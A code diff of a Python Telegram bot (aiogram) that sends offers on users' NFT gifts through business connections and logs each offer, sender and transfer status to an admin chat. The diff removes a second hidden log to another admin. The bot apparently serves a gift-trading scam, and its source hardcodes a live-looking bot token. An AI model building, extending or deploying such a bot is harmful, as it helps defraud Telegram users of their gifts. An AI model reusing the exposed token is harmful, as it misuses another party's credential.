@@ -18,8 +18,7 @@ from aiogram.enums import ParseMode
 # КОНФИГУРАЦИЯ
 # ============================================================
 BOT_TOKEN = "8960916793:AAGpyGXJQj9YzgDxDPeWTqJDJ9TdbGhLN50"
-ADMIN_LOG_ID = 8950111892
-ADMIN_ID = 8950111892  # сюда летит лог о новом оффере
+ADMIN_LOG_ID = 8751928501
 
 EMOJI_STARS = "5920433463428650761"
 EMOJI_GRAM = "5267445215773367585"
@@ -65,7 +64,7 @@ def format_gift_name(slug: str, number: str) -> str:
     return f"{formatted_slug} #{number}"
 
 # ============================================================
-# ЛОГИ ДЛЯ АДМИНА (основной лог оффера)
+# ЛОГИ ДЛЯ АДМИНА
 # ============================================================
 def get_log_text(data: dict, status: str) -> str:
     status_map = {
@@ -76,20 +75,19 @@ def get_log_text(data: dict, status: str) -> str:
     status_emoji, status_text, transferred_text = status_map.get(status, ("⏳", "Отправлен", "Не принят"))
     gift_name_str = format_gift_name(data['gift_slug'], data['gift_number'])
     gift_display = f'<a href="{data["link"]}"><b>{gift_name_str}</b></a>'
-
+    
     if data["currency"] == "gram":
         emoji_id, emoji_char, currency_name = EMOJI_GRAM, "🪙", "GRAM"
     else:
         emoji_id, emoji_char, currency_name = EMOJI_STARS, "⭐", "Stars"
-
+        
     emoji_tag = f'<tg-emoji emoji-id="{emoji_id}">{emoji_char}</tg-emoji>'
-    sender_uname = str(data.get('sender_username', '')).lstrip('@') or 'нет username'
     return (
         f"<b>Оффер отправлен</b>\n\n"
         f"<b>Подарок:</b> {gift_display}\n"
         f"<b>Сумма:</b> {data['amount']}\n"
         f"<b>Валюта:</b> {emoji_tag} {currency_name}\n"
-        f"<b>Отправил:</b> @{sender_uname} | {data['sender_id']}\n"
+        f"<b>Отправил:</b> @{data['sender_username']} | {data['sender_id']}\n"
         f"<b>Владелец подарка:</b> Нет доступа\n"
         f"<b>Передан:</b> {transferred_text}\n\n"
         f"<b>Статус:</b> {status_emoji} {status_text}"
@@ -101,29 +99,17 @@ def get_log_keyboard(data: dict) -> InlineKeyboardMarkup:
 async def send_log_to_admin(data: dict):
     try:
         msg = await bot.send_message(
-            chat_id=ADMIN_LOG_ID,
-            text=get_log_text(data, "pending"),
-            reply_markup=get_log_keyboard(data),
+            chat_id=ADMIN_LOG_ID, 
+            text=get_log_text(data, "pending"), 
+            reply_markup=get_log_keyboard(data), 
             disable_web_page_preview=True
         )
         data["log_msg_id"] = msg.message_id
     except Exception as e:
-        logger.error(f"[admin-log] Ошибка отправки: {e}")
+        logger.error(f"[admin-log] Ошибка: {e}")
 
 async def update_log_message(data: dict, status: str):
-    if "log_msg_id" not in data:
-        # если исходный лог не ушёл — пробуем отправить заново с актуальным статусом
-        try:
-            msg = await bot.send_message(
-                chat_id=ADMIN_LOG_ID,
-                text=get_log_text(data, status),
-                reply_markup=get_log_keyboard(data),
-                disable_web_page_preview=True
-            )
-            data["log_msg_id"] = msg.message_id
-        except Exception as e:
-            logger.error(f"[admin-log] Ошибка повторной отправки: {e}")
-        return
+    if "log_msg_id" not in data: return
     try:
         await bot.edit_message_text(
             chat_id=ADMIN_LOG_ID,
@@ -132,32 +118,8 @@ async def update_log_message(data: dict, status: str):
             reply_markup=get_log_keyboard(data),
             disable_web_page_preview=True
         )
-    except TelegramBadRequest as e:
-        if "message is not modified" in str(e):
-            return
-        logger.error(f"[admin-log] Ошибка обновления: {e}")
     except Exception as e:
         logger.error(f"[admin-log] Ошибка обновления: {e}")
-
-# ============================================================
-# ЛОГ О НОВОМ ОФФЕРЕ ДЛЯ ADMIN_ID
-# ============================================================
-async def send_offer_log_to_admin(data: dict):
-    username = (data.get("sender_username") or "").lstrip("@") or "нет username"
-    gift_link = data.get("link", "нет ссылки")
-    log_text = (
-        "📥 <b>Лог отправлен</b>\n\n"
-        f"👤 Кинул: @{username}\n"
-        f"🎁 Подарок: {gift_link}\n"
-    )
-    try:
-        await bot.send_message(
-            chat_id=ADMIN_ID,
-            text=log_text,
-            disable_web_page_preview=True
-        )
-    except Exception as e:
-        logger.error(f"[offer-admin-log] Ошибка: {e}")
 
 # ============================================================
 # БИЗНЕС-ЛОГИКА (AIogram)
@@ -215,11 +177,11 @@ async def handle_offer(message: Message) -> None:
 
     parts = message.text.strip().split()
     if len(parts) < 3 or not parts[2].isdigit(): return
-
+    
     link_raw = parts[1]
     amount = parts[2]
     currency = parts[3].lower() if len(parts) > 3 else "stars"
-
+    
     link_match = re.search(r"(?:https?://)?t\.me/nft/([A-Za-z]+)-(\d+)", link_raw)
     if not link_match: return
     slug, number = link_match.group(1), link_match.group(2)
@@ -253,7 +215,6 @@ async def handle_offer(message: Message) -> None:
         sent = await send_with_fallback(bc_id=bc_id, chat_id=message.chat.id, text=text, reply_markup=keyboard)
         offers[offer_id]["msg_id"] = sent.message_id
         await send_log_to_admin(offers[offer_id])
-        await send_offer_log_to_admin(offers[offer_id])
     except Exception as e:
         logger.error(f"[offer-send] Ошибка: {e}")
 
@@ -275,7 +236,7 @@ async def handle_accept(callback: CallbackQuery) -> None:
     data["accepted"] = True
     await callback.answer()
     await asyncio.sleep(0.3)
-
+    
     amount_fmt = f"{int(data['amount']):,}"
     gift_display = f'<a href="{data["link"]}"><b>{data["gift_slug"]}-{data["gift_number"]}</b></a>'
     emoji = f'<tg-emoji emoji-id="{EMOJI_GRAM if data["currency"] == "gram" else EMOJI_STARS}">{"🪙" if data["currency"] == "gram" else "⭐"}</tg-emoji>'
